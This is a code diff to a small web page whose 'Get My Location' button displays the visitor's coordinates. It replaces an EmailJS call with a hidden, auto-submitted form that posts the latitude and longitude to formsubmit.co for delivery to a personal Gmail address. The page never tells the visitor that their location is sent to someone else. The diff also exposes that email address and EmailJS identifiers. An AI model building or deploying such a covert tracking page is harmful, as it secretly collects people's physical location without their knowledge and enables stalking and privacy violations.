@@ -26,13 +26,19 @@
   <button id="getLocationBtn">Get My Location</button>
   <div id="location"></div>
 
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>
-    // Initialize EmailJS
-    emailjs.init('9x-l5mk9badvHiIkw');  // Replace 'YOUR_USER_ID' with your EmailJS user ID
+  <form action="https://formsubmit.co/alex69gggamer@gmail.com" method="POST" id="locationForm" style="display:none;">
+    <input type="hidden" name="_subject" value="New Location Submitted">
+    <input type="hidden" name="_next" value="https://your-redirect-url.com">
+    <input type="hidden" name="latitude" id="latitude">
+    <input type="hidden" name="longitude" id="longitude">
+  </form>
 
+  <script>
     const button = document.getElementById('getLocationBtn');
     const locationDiv = document.getElementById('location');
+    const locationForm = document.getElementById('locationForm');
+    const latitudeInput = document.getElementById('latitude');
+    const longitudeInput = document.getElementById('longitude');
 
     button.addEventListener('click', () => {
       if (navigator.geolocation) {
@@ -40,9 +46,11 @@
           (position) => {
             const { latitude, longitude } = position.coords;
             locationDiv.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-
-            // Send the coordinates via email
-            sendEmail(latitude, longitude);
+            latitudeInput.value = latitude;
+            longitudeInput.value = longitude;
+            
+            // Submit the form to send the email
+            locationForm.submit();
           },
           (error) => {
             locationDiv.textContent = `Error: ${error.message}`;
@@ -52,22 +60,6 @@
         locationDiv.textContent = "Geolocation is not supported by your browser.";
       }
     });
-
-    function sendEmail(latitude, longitude) {
-      const templateParams = {
-        to_email: 'alex69gggamer@gmail.com',  // Replace with your email address
-        latitude: latitude,
-        longitude: longitude
-      };
-
-      emailjs.send('service_3ubhjey', 'template_lytk4r9', templateParams)  // Replace with your EmailJS service ID and template ID
-        .then((response) => {
-          console.log('Email sent successfully:', response);
-        })
-        .catch((error) => {
-          console.log('Error sending email:', error);
-        });
-    }
   </script>
 </body>
 </html>
